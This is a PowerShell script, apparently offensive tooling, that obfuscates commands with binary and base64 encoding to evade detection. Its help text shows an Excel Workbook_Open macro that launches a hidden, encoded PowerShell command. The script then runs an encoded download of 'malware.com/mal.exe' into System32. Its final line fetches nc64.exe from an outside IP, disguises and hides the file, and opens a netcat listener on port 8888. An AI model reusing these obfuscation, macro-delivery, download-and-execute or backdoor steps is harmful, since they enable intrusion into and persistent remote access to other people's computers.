<#
.SYNOPSIS
    .
.DESCRIPTION
    This script makes your string obfuscation
    You can using it to macro in excel but it can be blocked powershell, so you can run using cmd like below.
    
    Private Sub Workbook_Open()
    pscmd = "cmd /k powershell.exe -noP -sta -w 1 -enc endcodeData"
    Call Shell(pscmd, vbNormalFocus)
    End Sub

.PARAMETER Command
    Convert String to obfuscation

.EXAMPLE
    MakeEn.ps1 string

.NOTES
    Author: Hyeok Jang
    Date:   May 16, 2020
#>
<# encode by binary 

# binary is pOWErSHeLl
powershell -Command { "1110000|1001111|1010111|1000101|1110010|1010011|1001000|1100101|1001100|1101100".Split("|") | % { $CM+=[char][convert]::Toint32($_,2) }; powershell write-host $CM }

# binary is write-host asd
powershell -Command { "1110000|1101111|1110111|1100101|1110010|1110011|1101000|1100101|1101100|1101100|100000|1110111|1110010|1101001|1110100|1100101|101101|1101000|1101111|1110011|1110100|100000|1100001|1110011|1100100".Split("|") | % { $CM+=[char][convert]::Toint32($_,2) }; [sCRiPtbLOCk]::cREaTe($CM) | % { &$_ } }
#>
$Encoded = $Decoded = $null
"$command".toCHaRaRRay() | % { $Encoded += [convert]::ToString($([text.Encoding]::ASCII.GetBytes($_)),2) + "|" }
Write-Host $Encoded

$Encoded.split("|") | % { if($_ -ne "" ) { $Decoded += [char][convert]::Toint32($_,2)} }
Write-Host $Decoded

# encode by base64
$server = "http://malware.com/mal.exe"
$output = "C:\WINDOWS\SYSTEM32\mal.exe"

$sTR = "Start-BitsTransfer -Source $server -Destination $output"
$Encoded = [Convert]::ToBase64String( [System.Text.Encoding]::Unicode.GetBytes($sTR))
$Decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($Encoded))
Write-Host $Encoded
Write-Host $Decoded
powershell.exe -noP -sta -w 1 -enc $Encoded

(New-Object Net.WebClient).DownloadFile("http://192.168.219.102/nc64.exe","$env:USERPROFILE\Documents\omd.exe"); powershell.exe attrib +H +S "C:\Users\ysa72\Documents\omd.e
xe"; powershell.exe "$env:USERPROFILE\Documents\omd.exe -l -p 8888"
